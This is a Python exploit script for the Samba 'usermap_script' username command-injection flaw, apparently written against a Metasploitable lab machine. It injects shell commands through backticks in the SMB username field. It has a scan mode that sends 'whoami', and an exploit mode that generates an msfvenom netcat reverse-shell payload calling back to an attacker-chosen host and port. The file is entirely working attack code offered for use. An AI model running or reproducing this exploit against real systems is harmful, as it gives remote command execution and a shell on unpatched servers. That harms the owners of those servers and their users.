#!/usr/bin/python

from smb.SMBConnection import SMBConnection
import random, string
from smb import smb_structs
smb_structs.SUPPORT_SMB2 = False
import sys
import os
import re

#scan the target
def scan():
  result = 'whoami'
  username = "/=`nohup " + result + "`"
  password = ""
  conn = SMBConnection(username, password, "SOMEBODYHACKINGYOU" , "METASPLOITABLE", use_ntlm_v2 = False)
  try:
    conn.connect(sys.argv[1], 445)
    print("Target is vulnerable")
  except:
    print("Target is not vulnerable")

def exploit():
  # Shellcode: 
  os.system("msfvenom -p cmd/unix/reverse_netcat LHOST=%s LPORT=%s -f python -o shellcode.txt"%(sys.argv[2],sys.argv[3]))

  BYTE_REGEX = r"\\x([\w|\d]{2})" # extract bytes from string, without leading `\x`

  # retrieve text
  with open('shellcode.txt', 'r') as f:
    file_text = f.read()

  buf_list = []
  for byte in re.findall(BYTE_REGEX, file_text):
    #scan string and treat all bytes one by one
    buf_list.append(int(byte, base=16))

  result = bytearray(buf_list)
  result = result.decode()

  username = "/=`nohup " + result + "`"
  password = ""
  conn = SMBConnection(username, password, "SOMEBODYHACKINGYOU" , "METASPLOITABLE", use_ntlm_v2 = False)
  os.system("rm shellcode.txt")
  print("check your listener")
  conn.connect(sys.argv[1], 445)

#get arguments
if len(sys.argv) > 2:
   if sys.argv[2] == "scan" :    
      scan()
      sys.exit() 
elif len(sys.argv) < 2 :
      print ("\nUsage: " + sys.argv[0] + " <Target> <lhost> <lport> exploit or "+sys.argv[0]+" <Target> scan\n")
      sys.exit() 

if len(sys.argv) < 5:
    print ("\nUsage: " + sys.argv[0] + " <Target> <lhost> <lport> exploit or "+sys.argv[0]+" <Target> scan\n")
    sys.exit()

elif sys.argv[4] == "exploit" :
    print("let's exploit")
    exploit()
else : print("check if you spelled your everything correctly")
